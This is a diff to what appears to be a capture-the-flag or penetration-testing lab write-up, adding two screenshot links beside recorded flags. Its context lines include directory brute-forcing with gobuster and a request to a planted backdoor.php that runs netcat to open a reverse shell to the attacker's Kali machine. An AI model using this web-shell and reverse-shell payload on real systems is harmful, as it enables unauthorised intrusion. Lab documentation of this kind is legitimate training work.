@@ -68,6 +68,7 @@ fi
   - Commands run:
     - `gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://192.168.1.115`
     - `http://192.168.1.115/vendor/PATH` (In Kali web browser.)
+- ![flag1](./Images/Target2/flag1.JPG)
 
 - `flag2.txt`: `6a8ed560f0b5358ecf844108048eb337`
   - **Exploit Used**
@@ -79,6 +80,7 @@ fi
     - `http://<Target 2 URL>/backdoor.php?cmd=nc%20<Kali IP>%204444%20-e%20/bin/bash' (In Kali web browser.)
     - `cd /var/www`
     - `cat flag2.txt`
+- ![flag2](./Images/Target2/flag2.JPG)
 
 - `flag3.png`: `a0f568aa9de277887f37730d71520d9b`
   - **Exploit Used**
